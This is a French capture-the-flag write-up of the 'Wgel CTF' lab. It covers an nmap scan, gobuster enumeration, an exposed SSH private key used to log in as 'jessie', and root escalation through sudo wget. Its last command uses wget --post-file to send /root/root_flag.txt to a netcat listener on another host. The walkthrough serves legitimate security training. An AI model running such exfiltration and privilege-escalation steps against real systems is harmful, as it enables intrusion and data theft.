- **IP**
```
10.10.146.231
```

On commence par un scan **nmap**

![[Wgel CTF/file/nmap.png]]

On peut voir l'interface web via le port 80:
![[Wgel CTF/file/web.png]]
On tombe sur la page par défaut de Apache. Lorsque on regarde le code source on trouve un **username** (on va garder ça pour plus tard)

![[jessie.png]]

On va maintenant faire une énumération de répertoire avec **gobuster**

```
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.10.146.231/
```

![[Wgel CTF/file/gobuster.png]]

![[sitemap.png]]

Le code source de cette page ne montre rien, il n'y a aucun formulaire, donc on va aller plus loin en faisant une énumération avec **gobuster**

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.146.231/sitemap/ -t 25 -x php,html,txt -q
```

![[gobuster_sitemap.png]]
On peut voir qu'il y a le répertoire `/.ssh` qui pourrait contenir une clé ssh

![[Wgel CTF/file/ssh.png]]

Nous allons copier tout ça dans un fichier et essayer de se connecter via ssh avec l'utilisateur **jessie** que nous avons découvert ultérieurement

```
chmod 600 sshkey
ssh jessie@10.10.146.231 -i sshkey
```

![[Wgel CTF/file/userflag.png]]
Maintenant on doit chercher ce qu'on peut exécuter avec les droiys **sudo**

```
sudo -l -l
```

![[Wgel CTF/file/sudo.png]]

![[wget.png]]

Avant de faire ces commandes, nous allons ouvrir un serveur en écoute avec **netcat**

```
nc -lvnp 4445
```

```
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.23.203.42:4445
```

![[Wgel CTF/file/rootflag.png]]
